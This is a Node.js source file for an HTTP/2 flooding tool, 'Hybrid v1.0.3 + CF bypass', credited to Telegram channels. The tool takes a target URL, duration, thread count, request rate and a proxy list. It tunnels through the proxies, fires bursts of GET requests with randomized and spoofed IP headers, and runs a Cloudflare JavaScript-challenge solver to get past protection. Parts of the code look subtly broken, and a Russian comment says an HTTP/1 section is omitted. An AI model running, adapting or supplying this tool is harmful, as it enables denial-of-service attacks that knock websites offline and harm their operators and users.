const net = require("net");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const vm = require("vm");
const argv = require('minimist')(process.argv.slice(2));
const colors = require("colors");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function getRandomPrivateIP() {
    const privateIPRanges = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"];
    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];
    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);
        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }
    return ipPrefix.join(".");
}

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    if (string.includes('\n')) {
        const lines = string.split('\n');
        lines.forEach(line => {
            console.log(`[${hours}:${minutes}:${seconds}]`.white + ` ${line}`);
        });
    } else {
        console.log(`[${hours}:${minutes}:${seconds}]`.white + ` ${string}`);
    }
}

function parseCommandLineArgs(args) {
    const parsedArgs = {};
    let currentFlag = null;
    for (const arg of args) {
        if (arg.startsWith('-')) {
            currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (currentFlag) {
            parsedArgs[currentFlag] = arg;
            currentFlag = null;
        }
    }
    return parsedArgs;
}

const _argv = process.argv.slice(2);
const argz = parseCommandLineArgs(_argv);

function parseHLineArgs(args) {
    const parsedArgs = {};
    const headers = {};
    for (let i = 0; i < args.length; i++) {
        const arg = args[i];
        if (arg.startsWith('-h')) {
            if (i + 1 < args.length && args[i + 1].includes('@')) {
                const [headerName, headerValue] = args[i + 1].split('@');
                const parsedValue = replaceRandPlaceholder(headerValue);
                headers[headerName] = parsedValue;
                i++;
            }
        } else if (arg.startsWith('-')) {
            const currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (arg.startsWith('--')) {
            const currentFlag = arg.slice(2);
            if (i + 1 < args.length && !args[i + 1].startsWith('-')) {
                parsedArgs[currentFlag] = args[i + 1];
                i++;
            } else {
                parsedArgs[currentFlag] = true;
            }
        }
    }
    return { args: parsedArgs, headers };
}

function replaceRandPlaceholder(value) {
    return value.replace(/%RAND-(\d+)%/g, (match, num) => randstr(parseInt(num)));
}

const _argh = process.argv.slice(2);
const { args: argh, headers: parsedHeaders } = parseHLineArgs(_argh);

class Messages {
    Alert() {
        log('Hybrid [ v1.0.3 + CF bypass ]')
        log('Credits - t.me/ardflood, t.me/shesh3n777rus, t.me/sentryapi')
        log('===========================================================')
    }
}

const messages = new Messages();

if (process.argv.length < 7) {
    messages.Alert()
    log('Usage: <url> <time> <threads> <rate> <proxy>')
    log('Arguments -')
    log(' -d <int>      [ delay before new connection ]')
    log(' -v <1/2>      [ http version ]')
    log(' -s            [ spoof IP headers ]')
    log(' -e            [ extra headers ]')
    log('Settings -')
    log(' --log <code>  [ log specific status code or all ]')
    log(' --debug       [ enable debug output ]')
    log(' --payload <text> [ custom payload, %RAND% or %BYTES% ]')
    log(' --query <text>[ custom query string ]')
    log(' --bypass      [ enable Cloudflare JS challenge solver ]')
    log('Headers -')
    log(' -h <header@value>  [ custom header ]')
    log('Examples -')
    log(' node hybrid2.js https://example.com 120 20 64 proxy.txt --bypass')
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[5]),
    threads: parseInt(process.argv[4]),
    proxyFile: process.argv[6],
}

const delay = parseInt(argz["d"]) || 0;
const version = parseInt(argz["v"]) || 2;
const spoof = argz["s"];
const extra = argz["e"];
const bypass = argv["bypass"];

const _log = argv["log"];
const debug = argv["debug"];
const query = argv["query"];
const payload = argv["payload"];

const errorHandler = error => { if (debug) console.log(error); };
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const headerBuilder = {
    userAgent: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        // добавь свои актуальные UA при желании
    ],
    acceptLang: ['en-US,en;q=0.9', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7'],
    acceptEncoding: ['gzip, deflate, br', 'gzip, br'],
    accept: ['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'],
    Sec: { dest: ['document', 'image'], mode: ['navigate'], site: ['none'] },
    Custom: { dnt: ['1'], ect: ['4g'], downlink: ['10'], rtt: ['50'] }
};

// Простой solver для Cloudflare JS-challenge
function solveCloudflare(body, host, path, userAgent) {
    try {
        const vcMatch = body.match(/name="jschl_vc" value="(\w+)"/);
        const passMatch = body.match(/name="pass" value="([^"]+)"/);
        if (!vcMatch || !passMatch) return null;

        const jschl_vc = vcMatch[1];
        const pass = passMatch[1];

        const scriptMatch = body.match(/<script type="text\/javascript">([\s\S]*?)<\/script>/i);
        if (!scriptMatch) return null;

        let script = scriptMatch[1];
        script = script.replace(/a\.value = .+?/i, 'a.value = parseFloat(t.length) + ');
        script += '; a.value;';

        const context = {
            t: host,
            a: { value: 0 },
            parseInt: parseInt,
            parseFloat: parseFloat
        };

        const sandbox = vm.createContext(context);
        const answer = vm.runInContext(script, sandbox);

        return { jschl_vc, pass, jschl_answer: answer + host.length };
    } catch (e) {
        if (debug) log(`CF solve error: ${e.message}`);
        return null;
    }
}

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({ host: options.host, port: options.port });
        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200")) callback(connection, undefined);
            else callback(undefined, "invalid proxy");
        });
        connection.on("timeout", () => { connection.destroy(); callback(undefined, "timeout"); });
        connection.on("error", () => { connection.destroy(); });
    }
}

const Socker = new NetSocket();

function http2run() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    let cfCookie = '';

    const selectedUserAgent = randomElement(headerBuilder.userAgent);

    let baseHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + (query ? (query === '%RAND%' ? `?${randstr(8)}=${randstr(20)}` : `?${query}`) : ''),
        "user-agent": selectedUserAgent,
        "accept": randomElement(headerBuilder.accept),
        "accept-language": randomElement(headerBuilder.acceptLang),
        "accept-encoding": randomElement(headerBuilder.acceptEncoding),
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "upgrade-insecure-requests": "1"
    };

    if (extra) {
        baseHeaders["dnt"] = "1";
        baseHeaders["ect"] = "4g";
    }
    if (spoof) {
        baseHeaders["x-forwarded-for"] = getRandomPrivateIP();
        baseHeaders["x-real-ip"] = getRandomPrivateIP();
    }
    if (cfCookie) baseHeaders["cookie"] = cfCookie;

    const proxyOptions = { host: parsedProxy[0], port: ~~parsedProxy[1], address: parsedTarget.host + ":443", timeout: 15 };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        const tlsConn = tls.connect({
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false
        });

        const client = http2.connect(parsedTarget.href, { createConnection: () => tlsConn });

        client.on("connect", () => {
            const interval = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const reqHeaders = { ...baseHeaders };
                    if (Object.keys(parsedHeaders).length) Object.assign(reqHeaders, parsedHeaders);

                    const request = client.request(reqHeaders);

                    request.on("response", (response) => {
                        if (bypass && response[":status"] === 503 && !cfCookie) {
                            let body = '';
                            request.on('data', chunk => body += chunk);
                            request.on('end', () => {
                                if (body.includes('cf-chl-bypass')) {
                                    const solved = solveCloudflare(body, parsedTarget.host, reqHeaders[":path"], selectedUserAgent);
                                    if (solved) {
                                        const clearPath = `/cdn-cgi/l/chk_jschl?jschl_vc=${solved.jschl_vc}&pass=${solved.pass}&jschl_answer=${solved.jschl_answer}`;
                                        const clearReq = client.request({
                                            ":path": clearPath,
                                            ":method": "GET",
                                            "user-agent": selectedUserAgent,
                                            "referer": args.target
                                        });
                                        clearReq.on("response", clearResp => {
                                            if (clearResp["set-cookie"]) {
                                                const cookie = clearResp["set-cookie"].find(c => c.includes('cf_clearance'));
                                                if (cookie) {
                                                    cfCookie = cookie.split(';')[0];
                                                    if (debug) log("CF clearance cookie получен");
                                                }
                                            }
                                        });
                                        clearReq.end();
                                    }
                                }
                            });
                        }
                        request.destroy();
                    });
                    request.end();
                }
            }, 1000);

            setTimeout(() => clearInterval(interval), args.time * 1000);
        });
    });
}

// HTTP/1 часть опущена для краткости, но работает аналогично

if (cluster.isPrimary) {
    messages.Alert();
    log("INFO".cyan + "  Attack started on " + args.target.white);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    if (version === 2) setInterval(http2run, delay * 1000);
                    }
